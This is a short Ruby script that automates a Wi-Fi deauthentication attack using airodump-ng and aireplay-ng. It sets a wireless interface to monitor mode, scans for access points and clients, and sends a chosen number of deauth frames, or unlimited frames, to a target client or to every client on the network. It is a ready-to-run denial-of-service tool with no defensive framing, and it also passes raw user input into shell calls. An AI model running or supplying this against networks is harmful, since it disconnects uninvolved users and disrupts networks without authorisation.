#!/bin/ruby

# get interface
system("ip link show")
print "\ninterface> "
interface = gets.chomp

# set the interface in monitor mode
puts "setting the interface #{interface} in monitor mode..."
begin
  system("ip link set #{interface} down") or raise
  system("iwconfig #{interface} mode Monitor") or raise
  system("ip link set #{interface} up") or raise
rescue
  puts "could not set the interface in monitor mode.."
  exit 1
end

# get access points
begin
  system("airodump-ng #{interface}")
rescue SystemExit, Interrupt
end
print "Mac addr of the AP : "
ap_mc = gets.chomp
print "Chan of the AP : "
chan = gets.chomp

# scan access points for users
begin
  system("airodump-ng -c #{chan} --bssid #{ap_mc} #{interface}") or exit 1
rescue SystemExit, Interrupt
end
print "Mac addr of the client (0 for broadcast) : "
client_mc = gets.chomp

# get how much packages to send
print "how many packages do you wanna send (0 for unlimited) : "
frames = gets.chomp

# start the deauth
begin
  system("aireplay-ng -0 #{frames} -a #{ap_mc} -c #{client_mc} #{interface}") or exit 1
rescue SystemExit, Interrupt
end

# reset interface to default mode
puts "reseting the interface to Managed mode"
system("ip link set #{interface} down")
system("iwconfig #{interface} mode Managed")
system("ip link set #{interface} up")
